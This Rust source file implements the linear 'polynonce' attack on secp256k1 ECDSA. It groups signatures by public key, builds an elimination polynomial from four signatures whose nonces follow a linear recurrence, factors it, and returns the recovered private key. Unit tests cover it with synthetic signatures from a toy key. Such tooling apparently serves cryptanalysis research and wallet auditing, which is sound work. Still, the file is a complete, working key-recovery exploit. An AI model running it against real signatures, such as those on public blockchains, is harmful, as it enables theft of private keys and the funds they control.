//! Polynonce attack implementation

use super::*;
use crate::math::feanor::{bigint_from_be_bytes, bigint_to_scalar, secp256k1_order_bigint};
use crate::math::scalar_to_decimal_string;
use crate::signature::group_by_pubkey_ordered;
use feanor_math::algorithms::poly_factor::FactorPolyField;
use feanor_math::delegate::DelegateRing;
use feanor_math::field::FieldStore;
use feanor_math::homomorphism::Homomorphism;
use feanor_math::ring::RingStore;
use feanor_math::rings::poly::dense_poly::DensePolyRing;
use feanor_math::rings::poly::PolyRingStore;
use feanor_math::rings::rust_bigint::RustBigintRing;
use feanor_math::rings::zn::zn_big::Zn;
use feanor_math::rings::zn::ZnRingStore;
use k256::Scalar;

/// Macro to set up the polynomial ring and build the elimination polynomial.
///
/// This macro eliminates code duplication across methods that need to:
/// 1. Set up the field Fp = Z/nZ
/// 2. Create the polynomial ring over Fp
/// 3. Build k_i(d) polynomials from signatures
/// 4. Construct the elimination polynomial
///
/// The macro provides access to:
/// - `zz`: Base integer ring (RustBigintRing)
/// - `zn`: Quotient ring Z/nZ
/// - `fp`: Field Fp = Z/nZ
/// - `poly_ring`: Polynomial ring over Fp
/// - `elimination_poly`: The elimination polynomial
macro_rules! with_elimination_poly {
    ($sigs:expr, |$zz:ident, $zn:ident, $fp:ident, $poly_ring:ident, $elimination_poly:ident| $body:expr) => {{
        // Set up the field Fp = Z/nZ where n is the secp256k1 order
        let $zz = RustBigintRing::RING;
        let n = secp256k1_order_bigint();
        let $zn = Zn::new($zz, n);
        let $fp = $zn.clone().as_field().expect("secp256k1 order should be prime");

        // Create polynomial ring over Fp
        let $poly_ring = DensePolyRing::new(&$fp, "d");

        // Build k_i(d) = c_i0 + c_i1*d where:
        //   c_i0 = z_i * s_i^(-1)
        //   c_i1 = r_i * s_i^(-1)
        let k_polys: Vec<_> = $sigs
            .iter()
            .take(4)
            .map(|sig| {
                let s_inv = sig.s.invert();
                let s_inv = Option::<Scalar>::from(s_inv).expect("s should be invertible");

                let c0 = sig.z * s_inv; // z_i * s_i^(-1)
                let c1 = sig.r * s_inv; // r_i * s_i^(-1)

                // Convert to field elements
                let c0_big = bigint_from_be_bytes(&c0.to_bytes());
                let c1_big = bigint_from_be_bytes(&c1.to_bytes());

                let c0_fp = $fp.can_hom(&$zz).unwrap().map(c0_big);
                let c1_fp = $fp.can_hom(&$zz).unwrap().map(c1_big);

                // k_i(d) = c0 + c1*d
                $poly_ring.from_terms([(c0_fp, 0), (c1_fp, 1)])
            })
            .collect();

        // d0 = k_1 - k_0
        let d0 = $poly_ring.sub(
            $poly_ring.clone_el(&k_polys[1]),
            $poly_ring.clone_el(&k_polys[0]),
        );

        // d1 = k_2 - k_1
        let d1 = $poly_ring.sub(
            $poly_ring.clone_el(&k_polys[2]),
            $poly_ring.clone_el(&k_polys[1]),
        );

        // d2 = k_3 - k_2
        let d2 = $poly_ring.sub(
            $poly_ring.clone_el(&k_polys[3]),
            $poly_ring.clone_el(&k_polys[2]),
        );

        // Elimination: d0 * d2 - d1^2 = 0
        let lhs = $poly_ring.mul(d0, d2);
        let rhs = $poly_ring.mul($poly_ring.clone_el(&d1), d1);

        let $elimination_poly = $poly_ring.sub(lhs, rhs);

        $body
    }};
}

pub struct PolynonceAttack {
    degree: usize,
}

impl PolynonceAttack {
    pub fn new(degree: usize) -> Self {
        Self { degree }
    }

    /// Builds the elimination polynomial for the polynonce attack and evaluates
    /// whether the given scalar `d` is a root.
    ///
    /// For the linear case (degree=1), we have k_i = a + b*k_{i-1}.
    /// The elimination condition is: (k_1 - k_0)(k_3 - k_2) = (k_2 - k_1)^2
    ///
    /// Each nonce k_i(d) = z_i * s_i^(-1) + r_i * s_i^(-1) * d is a linear polynomial in d.
    /// The elimination polynomial has the private key d as a root.
    ///
    /// Returns `true` if `d` is a root of the elimination polynomial.
    pub fn is_root_of_elimination_poly(&self, sigs: &[Signature], d: &Scalar) -> bool {
        assert!(
            sigs.len() >= 4,
            "Need at least 4 signatures for linear polynonce attack"
        );
        assert_eq!(
            self.degree, 1,
            "Only linear (degree=1) polynonce is implemented"
        );

        self.build_and_evaluate_linear(sigs, d)
    }

    /// Builds the elimination polynomial for the linear case (degree=1)
    /// and evaluates it at the given point `d`.
    ///
    /// k_i(d) = (z_i + r_i*d) / s_i = z_i*s_i^(-1) + r_i*s_i^(-1)*d
    ///
    /// The elimination condition: (k_1 - k_0)(k_3 - k_2) - (k_2 - k_1)^2 = 0
    ///
    /// Returns `true` if the polynomial evaluates to zero at `d`.
    fn build_and_evaluate_linear(&self, sigs: &[Signature], d: &Scalar) -> bool {
        with_elimination_poly!(sigs, |zz, _zn, fp, poly_ring, elimination_poly| {
            // Evaluate at d
            let d_big = bigint_from_be_bytes(&d.to_bytes());
            let d_fp = fp.can_hom(&zz).unwrap().map(d_big);
            let result = poly_ring.evaluate(&elimination_poly, &d_fp, &fp.identity());

            fp.is_zero(&result)
        })
    }

    /// Returns the degree of the elimination polynomial.
    ///
    /// For the linear case, the elimination polynomial should be quadratic (degree 2).
    pub fn elimination_poly_degree(&self, sigs: &[Signature]) -> usize {
        assert!(
            sigs.len() >= 4,
            "Need at least 4 signatures for linear polynonce attack"
        );
        assert_eq!(
            self.degree, 1,
            "Only linear (degree=1) polynonce is implemented"
        );

        with_elimination_poly!(sigs, |_zz, _zn, _fp, poly_ring, elimination_poly| {
            poly_ring.degree(&elimination_poly).unwrap_or(0)
        })
    }

    /// Builds the elimination polynomial and finds all roots over Fp.
    ///
    /// Uses polynomial factorization to find roots. For a factor aX + b,
    /// the root is -b/a.
    fn find_elimination_poly_roots(&self, sigs: &[Signature]) -> Vec<Scalar> {
        assert!(
            sigs.len() >= 4,
            "Need at least 4 signatures for linear polynonce attack"
        );
        assert_eq!(
            self.degree, 1,
            "Only linear (degree=1) polynonce is implemented"
        );

        with_elimination_poly!(sigs, |_zz, zn, fp, poly_ring, elimination_poly| {
            // Handle zero polynomial case (degenerate)
            if poly_ring.is_zero(&elimination_poly) {
                return Vec::new();
            }

            // Factor the polynomial
            let (factors, _unit) =
                <_ as FactorPolyField>::factor_poly(&poly_ring, &elimination_poly);

            // Extract roots from linear factors
            // For a factor aX + b, the root is -b/a
            let mut roots = Vec::new();
            for (factor, _multiplicity) in factors {
                if poly_ring.degree(&factor) == Some(1) {
                    let b = poly_ring.coefficient_at(&factor, 0);
                    let a = poly_ring.coefficient_at(&factor, 1);
                    let root_fp = fp.negate(fp.div(b, a));

                    // Convert field element to ZnEl, then lift to BigInt
                    let root_zn = fp.get_ring().delegate(root_fp);
                    let root_int = zn.smallest_positive_lift(root_zn);
                    if let Some(scalar) = bigint_to_scalar(&root_int) {
                        roots.push(scalar);
                    }
                }
            }

            roots
        })
    }

    /// Verifies that the given private key d produces nonces that match the signature r values.
    ///
    /// From ECDSA: k_i = (z_i + r_i * d) / s_i
    /// And: r_i = (k_i * G).x mod n
    ///
    /// We compute k from d and the signature, then verify k*G has x-coordinate equal to r.
    ///
    /// # Why we only check the first signature
    ///
    /// Verifying against a single signature is sufficient because:
    /// 1. The elimination polynomial is constructed from all 4 signatures, so any root `d`
    ///    already satisfies the algebraic constraints across all signatures.
    /// 2. The verification here serves as a final sanity check to filter spurious roots
    ///    (the quadratic elimination polynomial may have up to 2 roots).
    /// 3. If a wrong `d` passes verification for one signature, it would need to produce
    ///    the correct (k*G).x by chance - the probability is ~1/n (secp256k1 order ~2^256),
    ///    making collision astronomically unlikely.
    /// 4. The ECDSA equation k = (z + r*d) / s deterministically ties d to the signature
    ///    components, so a single verification provides overwhelming confidence.
    fn verify_key(&self, d: &Scalar, sigs: &[Signature]) -> bool {
        use k256::elliptic_curve::ff::PrimeField;
        use k256::elliptic_curve::sec1::ToEncodedPoint;
        use k256::{AffinePoint, ProjectivePoint};

        // Checking all signatures would be redundant - see doc comment above
        let sig = &sigs[0];

        // Compute k = (z + r*d) / s
        let s_inv = sig.s.invert();
        let s_inv = match Option::<Scalar>::from(s_inv) {
            Some(v) => v,
            None => return false,
        };
        let k = (sig.z + sig.r * d) * s_inv;

        // Compute R = k*G
        let kg = ProjectivePoint::GENERATOR * k;
        let kg_affine: AffinePoint = kg.into();
        let kg_point = kg_affine.to_encoded_point(false);
        let x_bytes = match kg_point.x() {
            Some(x) => x,
            None => return false,
        };

        // r should equal x coordinate of k*G (mod n)
        let computed_r = match Scalar::from_repr_vartime(*x_bytes) {
            Some(r) => r,
            None => return false,
        };

        computed_r == sig.r
    }
}

impl Attack for PolynonceAttack {
    fn name(&self) -> &'static str {
        "polynonce"
    }

    fn min_signatures(&self) -> usize {
        self.degree + 3
    }

    fn detect(&self, signatures: &[Signature]) -> Vec<Vulnerability> {
        group_by_pubkey_ordered(signatures)
            .into_iter()
            .filter(|g| g.signatures.len() >= self.min_signatures())
            .filter(|g| g.pubkey.is_some()) // polynonce requires known pubkey
            .map(|group| Vulnerability {
                attack_type: self.name().to_string(),
                group,
            })
            .collect()
    }

    fn recover(&self, vuln: &Vulnerability) -> Option<RecoveredKey> {
        let sigs = &vuln.group.signatures;
        if sigs.len() < self.min_signatures() {
            return None;
        }

        // Find all roots of the elimination polynomial
        let roots = self.find_elimination_poly_roots(sigs);

        // Verify each root against the signatures
        for d in roots {
            if self.verify_key(&d, sigs) {
                return Some(RecoveredKey {
                    private_key: d,
                    private_key_decimal: scalar_to_decimal_string(&d),
                    pubkey: vuln.group.pubkey.clone(),
                });
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::signature::SignatureInput;

    /// Generates test signatures where nonces follow k_i = a + b*k_{i-1}.
    ///
    /// For testing, uses:
    /// - a = 100, b = 2
    /// - k_0 = 1000
    /// - k_1 = 100 + 2*1000 = 2100
    /// - k_2 = 100 + 2*2100 = 4300
    /// - k_3 = 100 + 2*4300 = 8700
    ///
    /// From ECDSA: s = k^(-1) * (z + r*d)
    /// We set z_i = i+1 and compute r_i from k_i (r = k*G).x
    /// Then compute s_i = k_i^(-1) * (z_i + r_i*d)
    fn generate_test_sigs_with_linear_nonce(d: Scalar, count: usize) -> Vec<Signature> {
        use k256::elliptic_curve::ff::PrimeField;
        use k256::elliptic_curve::sec1::ToEncodedPoint;
        use k256::{AffinePoint, ProjectivePoint};

        assert!(count >= 4, "Need at least 4 signatures");

        let a = Scalar::from(100u64);
        let b = Scalar::from(2u64);
        let k0 = Scalar::from(1000u64);

        // Generate nonces following k_i = a + b*k_{i-1}
        let mut nonces = Vec::with_capacity(count);
        nonces.push(k0);
        for i in 1..count {
            let k_prev = nonces[i - 1];
            let k_i = a + b * k_prev;
            nonces.push(k_i);
        }

        // Generate signatures
        nonces
            .into_iter()
            .enumerate()
            .map(|(i, k)| {
                // z_i = i + 1 (message hash, just for testing)
                let z = Scalar::from((i + 1) as u64);

                // r = (k*G).x mod n
                let kg = ProjectivePoint::GENERATOR * k;
                let kg_affine: AffinePoint = kg.into();
                let kg_point = kg_affine.to_encoded_point(false);
                let x_bytes = kg_point.x().expect("point should have x coordinate");

                // r is x coordinate interpreted as field element
                let r = Option::<Scalar>::from(Scalar::from_repr((*x_bytes).into()))
                    .expect("x coordinate should be valid scalar");

                // s = k^(-1) * (z + r*d)
                let k_inv = Option::<Scalar>::from(k.invert()).expect("k should be invertible");
                let s = k_inv * (z + r * d);

                Signature {
                    r,
                    s,
                    z,
                    pubkey: Some("02test".to_string()),
                    timestamp: Some(i as u64),
                }
            })
            .collect()
    }

    #[test]
    fn test_build_elimination_polynomial() {
        // Test with known values where we know the private key
        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);

        // d_known should be a root of the elimination polynomial
        assert!(
            attack.is_root_of_elimination_poly(&sigs, &d_known),
            "The private key d should be a root of the elimination polynomial"
        );

        // A random value should NOT be a root (with high probability)
        let random_d = Scalar::from(99999u64);
        assert!(
            !attack.is_root_of_elimination_poly(&sigs, &random_d),
            "A random value should not be a root of the elimination polynomial"
        );
    }

    #[test]
    fn test_elimination_poly_degree() {
        // Test that the polynomial has the expected degree
        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);
        let degree = attack.elimination_poly_degree(&sigs);

        // For the linear case, the elimination polynomial should be quadratic (degree 2)
        // (k_1 - k_0)(k_3 - k_2) - (k_2 - k_1)^2
        // Each k_i is linear in d, so (k_i - k_j) is linear
        // Product of two linear polys is quadratic
        assert_eq!(
            degree, 2,
            "Elimination polynomial for linear case should be quadratic (degree 2)"
        );
    }

    fn make_4_consecutive_sigs(pubkey: &str) -> Vec<Signature> {
        (1..=4)
            .map(|i| {
                Signature::try_from(SignatureInput {
                    r: format!("{}", 100 + i),
                    s: format!("{}", 200 + i),
                    z: format!("{}", 300 + i),
                    pubkey: Some(pubkey.to_string()),
                    timestamp: Some(i as u64),
                })
                .unwrap()
            })
            .collect()
    }

    #[test]
    fn test_polynonce_detection_minimum_4_sigs() {
        let attack = PolynonceAttack::new(1); // linear
        assert_eq!(attack.min_signatures(), 4);

        let sigs = make_4_consecutive_sigs("02abcdef");
        let vulns = attack.detect(&sigs);
        assert_eq!(vulns.len(), 1);
    }

    #[test]
    fn test_polynonce_insufficient_signatures() {
        let attack = PolynonceAttack::new(1); // degree=1 requires 4 sigs

        // Only 3 signatures - should return empty
        let sigs: Vec<Signature> = (1..=3)
            .map(|i| {
                Signature::try_from(SignatureInput {
                    r: format!("{}", 100 + i),
                    s: format!("{}", 200 + i),
                    z: format!("{}", 300 + i),
                    pubkey: Some("02abcdef".to_string()),
                    timestamp: Some(i as u64),
                })
                .unwrap()
            })
            .collect();

        let vulns = attack.detect(&sigs);
        assert!(vulns.is_empty(), "3 signatures should be insufficient for degree=1");
    }

    #[test]
    fn test_polynonce_filters_out_none_pubkey() {
        let attack = PolynonceAttack::new(1);

        // 4 signatures but all without pubkey
        let sigs: Vec<Signature> = (1..=4)
            .map(|i| {
                Signature::try_from(SignatureInput {
                    r: format!("{}", 100 + i),
                    s: format!("{}", 200 + i),
                    z: format!("{}", 300 + i),
                    pubkey: None,
                    timestamp: Some(i as u64),
                })
                .unwrap()
            })
            .collect();

        let vulns = attack.detect(&sigs);
        assert!(vulns.is_empty(), "Signatures without pubkey should be filtered out");
    }

    #[test]
    fn test_polynonce_multiple_pubkeys_separate_groups() {
        let attack = PolynonceAttack::new(1);

        let mut sigs = make_4_consecutive_sigs("02aaaaaa");
        sigs.extend(make_4_consecutive_sigs("02bbbbbb"));

        let vulns = attack.detect(&sigs);
        assert_eq!(vulns.len(), 2, "Should create separate vulnerability groups for each pubkey");

        let pubkeys: Vec<_> = vulns
            .iter()
            .filter_map(|v| v.group.pubkey.as_ref())
            .collect();
        assert!(pubkeys.contains(&&"02aaaaaa".to_string()));
        assert!(pubkeys.contains(&&"02bbbbbb".to_string()));
    }

    #[test]
    fn test_polynonce_key_recovery() {
        use crate::math::scalar_to_decimal_string;
        use crate::signature::SignatureGroup;

        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);
        let group = SignatureGroup {
            r: sigs[0].r,
            pubkey: Some("02abcdef".to_string()),
            signatures: sigs,
            confidence: 1.0,
        };
        let vuln = Vulnerability {
            attack_type: "polynonce".to_string(),
            group,
        };

        let recovered = attack.recover(&vuln).expect("Should recover private key");
        assert_eq!(recovered.private_key, d_known, "Recovered key should match known key");
        assert_eq!(
            recovered.private_key_decimal,
            scalar_to_decimal_string(&d_known),
            "Decimal representation should match"
        );
    }

    /// Generates fixture JSON for polynonce test.
    /// Run with: cargo test --features polynonce print_fixture_json -- --nocapture
    #[test]
    #[ignore]
    fn print_fixture_json() {
        use crate::math::scalar_to_decimal_string;
        use k256::elliptic_curve::sec1::ToEncodedPoint;
        use k256::{AffinePoint, ProjectivePoint};

        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        // Compute actual public key from private key
        let pubkey_point = ProjectivePoint::GENERATOR * d_known;
        let pubkey_affine: AffinePoint = pubkey_point.into();
        let pubkey_bytes = pubkey_affine.to_encoded_point(true);
        let pubkey_hex = hex::encode(pubkey_bytes.as_bytes());

        println!("Private key (d): {}", scalar_to_decimal_string(&d_known));
        println!("Public key (hex): {}", pubkey_hex);
        println!();
        println!("Fixture JSON:");
        println!("[");
        for (i, sig) in sigs.iter().enumerate() {
            let comma = if i < sigs.len() - 1 { "," } else { "" };
            println!(
                r#"  {{
    "r": "{}",
    "s": "{}",
    "z": "{}",
    "pubkey": "{}",
    "timestamp": {}
  }}{}"#,
                scalar_to_decimal_string(&sig.r),
                scalar_to_decimal_string(&sig.s),
                scalar_to_decimal_string(&sig.z),
                pubkey_hex,
                sig.timestamp.unwrap_or(0),
                comma
            );
        }
        println!("]");
    }
}
